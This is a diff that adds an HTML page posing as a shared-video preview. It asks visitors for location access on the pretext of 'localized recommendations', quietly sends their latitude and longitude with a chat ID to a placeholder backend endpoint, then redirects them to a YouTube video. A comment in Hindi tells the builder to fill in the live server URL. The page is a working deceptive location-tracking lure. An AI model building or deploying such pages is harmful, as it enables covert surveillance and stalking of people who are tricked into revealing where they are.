@@ -1,0 +1,68 @@
+here<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shared Video Preview</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
+        .container { max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        .btn { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 5px; font-weight: bold; }
+        .btn:hover { background: #006699; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>You have been shared a video link</h2>
+        <p>To view the content and see localized recommendations, please allow location access.</p>
+        <button class="btn" onclick="requestLocation()">View Video</button>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chat_id');
+        const targetVideo = urlParams.get('video_id') || 'dQw4w9WgXcQ'; 
+
+        // ⚠️ APNE BACKEND SERVER KA LIVE URL YAHAN DAALEIN
+        const BACKEND_URL = 'https://YOUR-BACKEND-SERVER.onrender.com'; 
+
+        function requestLocation() {
+            if (!navigator.geolocation) {
+                alert("Geolocation is not supported by your browser.");
+                redirectToVideo();
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const payload = {
+                        chat_id: chatId,
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude
+                    };
+
+                    try {
+                        await fetch(`${BACKEND_URL}/api/report-location`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                    } catch (error) {
+                        console.error("Error reporting data:", error);
+                    } finally {
+                        redirectToVideo();
+                    }
+                },
+                (error) => {
+                    console.warn("Location permission denied.");
+                    redirectToVideo(); 
+                }
+            );
+        }
+
+        function redirectToVideo() {
+            window.location.href = `https://www.youtube.com/watch?v=${targetVideo}`;
+        }
+    </script>
+</body>
+</html>
